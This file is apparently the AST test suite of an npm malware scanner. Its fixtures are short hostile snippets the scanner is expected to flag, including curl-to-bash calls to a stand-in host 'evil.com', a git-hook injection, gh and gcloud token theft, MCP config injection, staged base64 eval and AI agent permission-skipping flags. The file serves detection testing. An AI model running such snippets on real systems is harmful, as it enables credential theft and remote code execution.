const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScan, runScanDirect, cleanupTemp, TESTS_DIR } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-ast-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  return tmp;
}

async function runAstTests() {
  console.log('\n=== AST TESTS ===\n');

  test('AST: Detects .npmrc access', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, '.npmrc', 'Should detect .npmrc');
  });

  test('AST: Detects .ssh access', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, '.ssh', 'Should detect .ssh');
  });

  test('AST: Detects GITHUB_TOKEN', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, 'GITHUB_TOKEN', 'Should detect GITHUB_TOKEN');
  });

  test('AST: Detects NPM_TOKEN', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, 'NPM_TOKEN', 'Should detect NPM_TOKEN');
  });

  test('AST: Detects AWS_SECRET', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, 'AWS_SECRET', 'Should detect AWS_SECRET');
  });

  test('AST: Detects eval()', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, 'eval', 'Should detect eval');
  });

  test('AST: Detects exec()', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, 'exec', 'Should detect exec');
  });

  test('AST: Detects new Function()', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'));
    assertIncludes(output, 'Function', 'Should detect Function');
  });

  test('AST: Dynamic env access flagged as MEDIUM', () => {
    const output = runScan(path.join(TESTS_DIR, 'ast'), '--json');
    const result = JSON.parse(output);
    const dynamicEnv = result.threats.find(t => t.type === 'env_access' && t.severity === 'MEDIUM');
    assert(dynamicEnv, 'Dynamic process.env[var] should be MEDIUM');
  });

  // --- Indirect eval detection tests (P0-1, v2.2.13) ---

  await asyncTest('AST: Detects computed eval obj["eval"](x)', async () => {
    const tmp = makeTempPkg('const x = "code"; globalThis["eval"](x);');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('computed property'));
      assert(t, 'Should detect obj["eval"]() as dangerous_call_eval');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects computed Function obj["Function"](x)', async () => {
    const tmp = makeTempPkg('const x = "return 1"; globalThis["Function"](x)();');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_function' && t.message.includes('computed property'));
      assert(t, 'Should detect obj["Function"]() as dangerous_call_function');
      assert(t.severity === 'MEDIUM', 'Should be MEDIUM severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects sequence eval (0, eval)(x)', async () => {
    const tmp = makeTempPkg('const x = "code"; (0, eval)(x);');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('sequence expression'));
      assert(t, 'Should detect (0, eval)() as dangerous_call_eval');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects sequence Function (0, Function)(x)', async () => {
    const tmp = makeTempPkg('const x = "return 1"; (0, Function)(x);');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_function' && t.message.includes('sequence expression'));
      assert(t, 'Should detect (0, Function)() as dangerous_call_function');
      assert(t.severity === 'MEDIUM', 'Should be MEDIUM severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects globalThis alias + variable computed call g[k]()', async () => {
    const tmp = makeTempPkg('const g = globalThis;\nconst k = "eval";\ng[k]("code");');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('Dynamic global dispatch'));
      assert(t, 'Should detect globalThis alias + variable computed call as dangerous_call_eval');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: No false positive for obj["toString"]()', async () => {
    const tmp = makeTempPkg('const obj = {};\nobj["toString"]();\nobj["hasOwnProperty"]("x");');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' || t.type === 'dangerous_call_function');
      assert(!t, 'obj["toString"]() should NOT trigger dangerous_call_eval/function');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects .mjs file with eval', async () => {
    const tmp = makeTempPkg('eval("code");', 'index.mjs');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval');
      assert(t, 'Should detect eval in .mjs file');
      assert(t.file === 'index.mjs', 'File should be index.mjs');
    } finally { cleanupTemp(tmp); }
  });

  // --- Sandbox evasion detection ---

  await asyncTest('AST: Detects sandbox evasion via fs.existsSync(/.dockerenv)', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nif (fs.existsSync('/.dockerenv')) process.exit(0);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'sandbox_evasion');
      assert(t, 'Should detect sandbox evasion via /.dockerenv');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects sandbox evasion via fs.accessSync(/proc/1/cgroup)', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\ntry { fs.accessSync('/proc/1/cgroup'); } catch(e) {}`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'sandbox_evasion');
      assert(t, 'Should detect sandbox evasion via /proc/1/cgroup');
    } finally { cleanupTemp(tmp); }
  });

  // --- Workflow write detection ---

  await asyncTest('AST: Detects writeFileSync to .github/workflows (literal path)', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nfs.writeFileSync('.github/workflows/evil.yml', 'run: curl evil.com');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'workflow_write');
      assert(t, 'Should detect writeFileSync to .github/workflows');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects writeFileSync to .github/workflows via variable tracking', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst path = require('path');\nconst wf = path.join('.github', 'workflows');\nfs.writeFileSync(wf, 'run: evil');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'workflow_write');
      assert(t, 'Should detect writeFileSync to .github/workflows via variable tracking');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects mkdirSync creating .github/workflows', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst path = require('path');\nconst wf = path.join('.github', 'workflows');\nfs.mkdirSync(wf, {recursive: true});`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'workflow_write');
      assert(t, 'Should detect mkdirSync creating .github/workflows');
    } finally { cleanupTemp(tmp); }
  });

  // --- Binary dropper ---

  await asyncTest('AST: Detects binary dropper (chmod + exec compound)', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst { execSync } = require('child_process');\nfs.chmodSync('/tmp/payload', 0o755);\nexecSync('/tmp/payload');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'binary_dropper');
      assert(t, 'Should detect binary dropper pattern (chmod + exec)');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- crypto.createDecipher / createDecipheriv ---

  await asyncTest('AST: Detects crypto.createDecipher (flatmap-stream pattern)', async () => {
    const tmp = makeTempPkg(`const crypto = require('crypto');\nconst d = crypto.createDecipher('aes256', key);\nd.update(data);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'crypto_decipher');
      assert(t, 'Should detect crypto.createDecipher');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects crypto.createDecipheriv', async () => {
    const tmp = makeTempPkg(`const crypto = require('crypto');\nconst d = crypto.createDecipheriv('aes-256-cbc', key, iv);\nd.update(data);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'crypto_decipher');
      assert(t, 'Should detect crypto.createDecipheriv');
    } finally { cleanupTemp(tmp); }
  });

  // --- module._compile ---

  await asyncTest('AST: Detects module._compile()', async () => {
    const tmp = makeTempPkg(`const m = new module.constructor();\nm._compile('malicious code', 'fake.js');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_compile');
      assert(t, 'Should detect module._compile()');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- new Proxy(process.env) ---

  await asyncTest('AST: Detects new Proxy(process.env, handler)', async () => {
    const tmp = makeTempPkg(`const p = new Proxy(process.env, { get(t, k) { return t[k]; } });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_proxy_intercept');
      assert(t, 'Should detect new Proxy(process.env)');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Object.defineProperty(process.env) ---

  await asyncTest('AST: Detects Object.defineProperty(process.env)', async () => {
    const tmp = makeTempPkg(`Object.defineProperty(process.env, 'SECRET', { get() { return 'stolen'; } });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_proxy_intercept');
      assert(t, 'Should detect Object.defineProperty(process.env)');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Prototype hooking ---

  await asyncTest('AST: Detects globalThis.fetch override', async () => {
    const tmp = makeTempPkg(`const origFetch = globalThis.fetch;\nglobalThis.fetch = function(...a) { log(a); return origFetch(...a); };`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('fetch'));
      assert(t, 'Should detect globalThis.fetch override');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects XMLHttpRequest.prototype hooking', async () => {
    const tmp = makeTempPkg(`XMLHttpRequest.prototype.open = function(m, u) { exfil(u); };`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('XMLHttpRequest'));
      assert(t, 'Should detect XMLHttpRequest.prototype hooking');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects http.IncomingMessage.prototype hooking (CRITICAL)', async () => {
    const tmp = makeTempPkg(`const http = require('http');\nhttp.IncomingMessage.prototype.emit = function() {};`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('IncomingMessage'));
      assert(t, 'Should detect http.IncomingMessage.prototype hooking');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects http.request override', async () => {
    const tmp = makeTempPkg(`const http = require('http');\nhttp.request = function(opts, cb) { log(opts); };`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('http.request'));
      assert(t, 'Should detect http.request override');
    } finally { cleanupTemp(tmp); }
  });

  // --- require.cache poisoning ---

  await asyncTest('AST: Detects require.cache access', async () => {
    const tmp = makeTempPkg(`delete require.cache[require.resolve('fs')];`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'require_cache_poison');
      assert(t, 'Should detect require.cache access');
      assert(t.severity === 'HIGH', 'Single require_cache_poison should be HIGH (downgraded from CRITICAL)');
    } finally { cleanupTemp(tmp); }
  });

  // --- Env access: sensitive keyword escalation ---

  await asyncTest('AST: Detects process.env.SECRET_KEY as HIGH', async () => {
    const tmp = makeTempPkg(`const s = process.env.SECRET_KEY;`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_access' && t.severity === 'HIGH');
      assert(t, 'Should detect SECRET_KEY access as HIGH');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: No false positive for process.env.npm_config_registry', async () => {
    const tmp = makeTempPkg(`const r = process.env.npm_config_registry;`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_access');
      assert(!t, 'process.env.npm_config_* should NOT trigger env_access');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: No false positive for process.env.NODE_ENV', async () => {
    const tmp = makeTempPkg(`const e = process.env.NODE_ENV;`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_access');
      assert(!t, 'process.env.NODE_ENV should NOT trigger env_access');
    } finally { cleanupTemp(tmp); }
  });

  // --- String.fromCharCode + dynamic env ---

  await asyncTest('AST: Detects env_charcode_reconstruction with fromCharCode + process.env[key]', async () => {
    const tmp = makeTempPkg(`const k = String.fromCharCode(71,73,84,72,85,66,95,84,79,75,69,78);\nconst v = process.env[k];`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'env_charcode_reconstruction');
      assert(t, 'Should detect env_charcode_reconstruction');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Staged binary payload ---

  await asyncTest('AST: Detects staged binary payload (.png + eval)', async () => {
    const tmp = makeTempPkg(`const d = require('fs').readFileSync('payload.png');\neval(d.toString());`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'staged_binary_payload');
      assert(t, 'Should detect staged binary payload (.png + eval)');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Spawn with detached: true ---

  await asyncTest('AST: Detects spawn with {detached: true}', async () => {
    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn('node', ['script.js'], { detached: true });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'detached_process');
      assert(t, 'Should detect spawn with detached: true');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Spawn with shell binary ---

  await asyncTest('AST: Detects spawn(/bin/bash)', async () => {
    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn('/bin/bash', ['-c', 'whoami']);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_exec');
      assert(t, 'Should detect spawn with shell binary');
    } finally { cleanupTemp(tmp); }
  });

  // --- AI agent abuse ---

  await asyncTest('AST: Detects AI agent abuse (--yolo flag)', async () => {
    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nexecSync('claude --yolo "do something"');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'ai_agent_abuse');
      assert(t, 'Should detect AI agent abuse with --yolo flag');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects AI agent abuse (--dangerously-skip-permissions)', async () => {
    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn('claude', ['--dangerously-skip-permissions', 'task']);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'ai_agent_abuse');
      assert(t, 'Should detect --dangerously-skip-permissions');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Credential CLI theft ---

  await asyncTest('AST: Detects credential CLI theft (gh auth token)', async () => {
    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst token = execSync('gh auth token').toString();`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'credential_command_exec');
      assert(t, 'Should detect credential CLI theft via gh auth token');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects credential CLI theft (gcloud auth print-access-token)', async () => {
    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst t = execSync('gcloud auth print-access-token').toString();`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'credential_command_exec');
      assert(t, 'Should detect credential CLI theft via gcloud');
    } finally { cleanupTemp(tmp); }
  });

  // --- Dynamic require with decode ---

  await asyncTest('AST: Detects dynamic require with base64 decode (CRITICAL)', async () => {
    const tmp = makeTempPkg(`const m = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require' && t.severity === 'CRITICAL');
      assert(t, 'Should detect dynamic require with base64 decode as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects dynamic require with concat', async () => {
    const tmp = makeTempPkg(`const m = require('child' + '_process');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require');
      assert(t, 'Should detect dynamic require with string concatenation');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects dynamic require with template literal', async () => {
    const tmp = makeTempPkg('const name = "process";\nconst m = require(`child_${name}`);');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require');
      assert(t, 'Should detect dynamic require with template literal');
    } finally { cleanupTemp(tmp); }
  });

  // --- Staged eval decode ---

  await asyncTest('AST: Detects staged eval decode (eval + atob)', async () => {
    const tmp = makeTempPkg(`eval(atob('Y29uc29sZS5sb2coImhlbGxvIik='));`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'staged_eval_decode');
      assert(t, 'Should detect staged eval decode with atob');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects staged eval decode (eval + Buffer.from base64)', async () => {
    const tmp = makeTempPkg(`eval(Buffer.from('Y29uc29sZS5sb2coImhlbGxvIik=', 'base64').toString());`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'staged_eval_decode');
      assert(t, 'Should detect staged eval decode with Buffer.from base64');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects staged Function decode (Function call + atob)', async () => {
    const tmp = makeTempPkg(`Function(atob('cmV0dXJuIDE='))();`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'staged_eval_decode');
      assert(t, 'Should detect staged Function decode with atob');
    } finally { cleanupTemp(tmp); }
  });

  // --- Dynamic import ---

  await asyncTest('AST: Detects dynamic import of child_process', async () => {
    const tmp = makeTempPkg(`import('child_process').then(cp => cp.exec('whoami'));`, 'index.mjs');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_import');
      assert(t, 'Should detect dynamic import of child_process');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects dynamic import with computed argument', async () => {
    const tmp = makeTempPkg(`const m = 'child_process';\nimport(m).then(cp => cp.exec('whoami'));`, 'index.mjs');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_import' && t.message.includes('computed'));
      assert(t, 'Should detect dynamic import with computed argument');
    } finally { cleanupTemp(tmp); }
  });

  // --- Eval with constant string (LOW) vs dynamic (HIGH) ---

  await asyncTest('AST: eval with constant string is LOW severity', async () => {
    const tmp = makeTempPkg(`eval('1 + 2');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'LOW');
      assert(t, 'eval("1+2") should be LOW severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Dangerous exec with shell pipe ---

  await asyncTest('AST: Detects exec with curl pipe to shell', async () => {
    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nexecSync('curl http://evil.com/payload | bash');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_exec');
      assert(t, 'Should detect exec with curl pipe to shell');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Dynamic require + exec chain ---

  await asyncTest('AST: Detects dynamic require exec chain', async () => {
    const tmp = makeTempPkg(`const mod = require(name);\nmod.execSync('whoami');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require_exec');
      assert(t, 'Should detect execSync called on dynamically-required module');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Exec with temp file path via variable ---

  await asyncTest('AST: Detects exec of temp file path via variable', async () => {
    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst p = '/tmp/payload';\nexecSync(p);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_exec' && t.message.includes('binary dropper'));
      assert(t, 'Should detect exec of temp file via variable tracking');
    } finally { cleanupTemp(tmp); }
  });

  // --- Spawn with conditional shell binary ---

  await asyncTest('AST: Detects spawn with conditional shell binary', async () => {
    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn(process.platform === 'win32' ? 'cmd.exe' : '/bin/bash', ['-c', 'whoami']);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_exec' && t.message.includes('conditional'));
      assert(t, 'Should detect spawn with conditional shell binary');
    } finally { cleanupTemp(tmp); }
  });

  // --- AI agent dangerous flag as string literal ---

  await asyncTest('AST: Detects AI agent flag as string literal', async () => {
    const tmp = makeTempPkg(`const flag = '--dangerously-skip-permissions';`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'ai_agent_abuse');
      assert(t, 'Should detect AI agent dangerous flag as string literal');
    } finally { cleanupTemp(tmp); }
  });

  // --- Exec with dangerous cmd via variable ---

  await asyncTest('AST: Detects exec with dangerous cmd string via variable', async () => {
    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst cmd = 'curl http://evil.com';\nexecSync(cmd);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_exec');
      assert(t, 'Should detect exec with dangerous cmd via variable tracking');
    } finally { cleanupTemp(tmp); }
  });

  // --- readdirSync on .github/workflows ---

  await asyncTest('AST: Detects readdirSync on .github/workflows', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst path = require('path');\nconst wf = path.join('.github', 'workflows');\nconst files = fs.readdirSync(wf);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'workflow_write');
      assert(t, 'Should detect readdirSync on .github/workflows');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE: zlib_inflate_eval (AST-024)
  // ============================================

  await asyncTest('AST: Detects zlib + base64 + eval (SANDWORM_MODE pattern)', async () => {
    const code = `
const zlib = require('zlib');
const payload = Buffer.from('eJzLSM3JyQcABJgB8Q==', 'base64');
const decoded = zlib.inflateSync(payload).toString();
eval(decoded);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'zlib_inflate_eval');
      assert(t, 'Should detect zlib + base64 + eval as zlib_inflate_eval');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: zlib + base64 without eval → no zlib_inflate_eval detection', async () => {
    const code = `
const zlib = require('zlib');
const payload = Buffer.from('eJzLSM3JyQcABJgB8Q==', 'base64');
const decoded = zlib.inflateSync(payload).toString();
console.log(decoded);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'zlib_inflate_eval');
      assert(!t, 'Should NOT detect zlib_inflate_eval without eval/Function');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: eval + base64 without zlib → detected by existing rule, not AST-024', async () => {
    const code = `
const payload = Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString();
eval(payload);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const zlibRule = result.threats.find(t => t.type === 'zlib_inflate_eval');
      assert(!zlibRule, 'Should NOT trigger zlib_inflate_eval without zlib');
      // Should still be detected by existing eval rule
      const evalRule = result.threats.find(t => t.type === 'dangerous_call_eval');
      assert(evalRule, 'Should still detect eval by existing rule');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE: module_compile_dynamic (AST-025)
  // ============================================

  await asyncTest('AST: Detects Module._compile(dynamicVar) as CRITICAL', async () => {
    const code = `
const m = require('module');
const mod = new m();
const code = getPayload();
mod._compile(code, '/tmp/payload.js');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_compile_dynamic');
      assert(t, 'Should detect Module._compile with dynamic argument');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Module._compile with string literal → no module_compile_dynamic', async () => {
    const code = `
const m = new module.constructor();
m._compile('console.log("hello")', 'test.js');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_compile_dynamic');
      assert(!t, 'Should NOT trigger module_compile_dynamic for string literal args');
      // Should still detect the base module_compile rule
      const base = result.threats.find(t => t.type === 'module_compile');
      assert(base, 'Should still detect module_compile base rule');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE: write_execute_delete (AST-026)
  // ============================================

  await asyncTest('AST: Detects write + require + unlink anti-forensics pattern', async () => {
    const code = `
const fs = require('fs');
const shmFile = '/dev/shm/payload.js';
fs.writeFileSync(shmFile, maliciousCode);
require(shmFile);
fs.unlinkSync(shmFile);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'write_execute_delete');
      assert(t, 'Should detect write + require + unlink anti-forensics');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: write without delete → no write_execute_delete detection', async () => {
    const code = `
const fs = require('fs');
const tmpFile = '/tmp/data.js';
fs.writeFileSync(tmpFile, someCode);
require(tmpFile);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'write_execute_delete');
      assert(!t, 'Should NOT trigger write_execute_delete without file deletion');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE P2: R5 — MCP Config Injection (AST-027)
  // ============================================

  await asyncTest('AST: Detects MCP config injection to .cursor/mcp.json with mcpServers', async () => {
    const code = `
const fs = require('fs');
const path = require('path');
const config = JSON.stringify({ mcpServers: { evil: { command: "node", args: ["server.js"] } } });
fs.writeFileSync(path.join(os.homedir(), '.cursor', 'mcp.json'), config);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'mcp_config_injection');
      assert(t, 'Should detect MCP config injection to .cursor/mcp.json');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Write to .vscode/ without MCP content → no mcp_config_injection', async () => {
    const code = `
const fs = require('fs');
fs.writeFileSync('.vscode/settings.json', '{"editor.fontSize": 14}');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'mcp_config_injection');
      assert(!t, 'Should NOT detect mcp_config_injection for plain vscode settings');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE P2: R6 — Git Hooks Injection (AST-028)
  // ============================================

  await asyncTest('AST: Detects git hooks pre-commit write', async () => {
    const code = `
const fs = require('fs');
fs.writeFileSync('.git/hooks/pre-commit', '#!/bin/sh\\ncurl http://evil.com | sh');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'git_hooks_injection');
      assert(t, 'Should detect git hook injection to .git/hooks/pre-commit');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AST: Detects git config init.templateDir', async () => {
    const code = `
const { execSync } = require('child_process');
execSync('git config --global init.templateDir /tmp/evil-templates');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'git_hooks_injection');
      assert(t, 'Should detect git config init.templateDir injection');
      assert(t.severity === 'HIGH', 'Should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  // ============================================
  // SANDWORM_MODE P2: R7 — Env Harvesting Dynamic (AST-029)
  // ============================================

  await asyncTest('AST: Detects Object.entries(process.env) + TOKEN/SECRET patterns', async () => {
    const code = `
